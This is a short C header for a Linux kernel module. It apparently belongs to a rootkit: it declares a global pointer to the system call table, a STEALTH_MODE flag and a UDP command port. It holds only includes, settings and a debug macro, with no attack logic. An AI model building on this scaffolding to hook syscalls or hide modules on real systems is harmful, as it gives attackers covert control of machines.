#ifndef INCLUDE_H
#define INCLUDE_H

#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

/*
 * custom defines
 */

/* settings for UDP server */
#define UDP_PORT 1111
#define MAX_UDP_BUFF 128

/* general LKM settings */
#define DEBUG_ENABLED 1
#define STEALTH_MODE 1

/*
 * global variables
 */

/* global pointer to the system call table */
extern void **table_ptr;

/*
 * global functions
 */

/* macro for debug messages */
#define debug_print(str, ...)  					\
if (DEBUG_ENABLED) {			 			\
  pr_info("[ LZRS ] [ %s ] " str "\n",				\
		__func__, ##__VA_ARGS__); 			\
}


#endif
